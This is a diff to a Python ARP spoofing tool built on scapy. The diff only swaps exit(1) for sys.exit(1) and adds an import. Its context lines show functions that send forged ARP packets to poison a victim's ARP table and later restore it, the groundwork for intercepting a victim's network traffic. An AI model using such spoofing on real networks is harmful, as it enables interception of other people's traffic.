@@ -4,7 +4,7 @@ logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 import time
 import scapy.all as scapy
 import argparse
-
+import sys
 
 def get_arguments():
     parser = argparse.ArgumentParser()
@@ -34,7 +34,8 @@ def get_mac(ip):
         return answered_list[0][1].hwsrc
     except IndexError:
         print("[-] Could not get MAC address for " + ip + ". Exiting.")
-        exit(1)
+        sys.exit(1)
+
 
 
 def spoof_arp_table(victim_ip, victim_mac, false_requester_ip):
@@ -44,7 +45,7 @@ def spoof_arp_table(victim_ip, victim_mac, false_requester_ip):
         scapy.send(target_arp_packet, verbose=False)  # To modify ARP table of victim
     except:
         print("[-] Could not send ARP packet to " + victim_ip + ". Exiting.")
-        exit(1)
+        sys.exit(1)
 
 
 def restore_arp_table(victim_ip, victim_mac, false_requester_ip, false_requester_mac):
@@ -54,7 +55,7 @@ def restore_arp_table(victim_ip, victim_mac, false_requester_ip, false_requester
         scapy.send(target_arp_packet, verbose=False)  # To modify ARP table of victim
     except:
         print("[-] Could not send ARP packet to " + victim_ip + ". Exiting.")
-        exit(1)
+        sys.exit(1)
 
 def scan_network(ip, timeout=3):
     arp_req = scapy.ARP(pdst=ip)
